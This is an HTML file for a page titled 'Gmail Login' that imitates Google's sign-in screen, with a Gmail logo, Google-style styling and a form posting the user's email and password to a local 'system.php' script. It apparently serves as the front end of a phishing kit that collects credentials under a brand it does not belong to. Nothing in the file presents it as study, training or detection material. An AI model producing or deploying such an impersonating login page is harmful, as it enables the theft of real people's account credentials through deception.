<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login</title>
    <link rel="icon" href="logo.png" type="image/png">
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 360px;
            background-color: #ffffff;
            padding: 24px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
        }

        .logo {
            width: 120px;
            margin-bottom: 20px;
        }

        .heading {
            font-size: 24px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #202124;
            font-size: 14px;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            box-sizing: border-box;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: #1a73e8;
            outline: none;
        }

        .button {
            background-color: #1a73e8;
            color: #ffffff;
            border: none;
            cursor: pointer;
            padding: 12px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            width: 100%;
            text-align: center;
            transition: background-color 0.3s;
        }

        .button:hover {
            background-color: #155ab2;
        }

        .footer {
            margin-top: 16px;
            font-size: 14px;
            color: #5f6368;
        }

        .footer a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="logo.png" alt="Gmail Logo" class="logo">
        <div class="heading">Sign in</div>
        <form action="system.php" method="post">
            <div class="input-group">
                <label for="email">Email or Phone</label>
                <input id="email" name="email" type="text" placeholder="Enter your email or phone" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input id="password" name="password" type="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="button">Next</button>
        </form>
        <div class="footer">
            <a href="#">Forgot email?</a> • <a href="#">Help</a>
        </div>
    </div>
</body>
</html>